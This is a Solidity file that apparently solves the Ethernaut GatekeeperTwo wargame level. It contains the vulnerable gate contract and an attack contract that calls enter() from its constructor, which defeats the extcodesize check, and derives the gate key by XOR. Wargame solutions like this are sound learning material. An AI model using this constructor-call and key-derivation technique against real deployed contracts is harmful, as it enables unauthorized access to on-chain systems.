// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        console.log("passed gateOne");
        console.log(msg.sender);
        console.log(tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        console.log("passed gateTwo");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract BreakGateKeeperTwo {
    GatekeeperTwo public gateKeeperTwo;
    bytes8 public gateKey;

    constructor(address _address) {
        gateKeeperTwo = GatekeeperTwo(_address);
        uint64 temp = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        gateKey = bytes8(temp);

        require(gateKeeperTwo.enter(gateKey), "hack failed");
    }
}
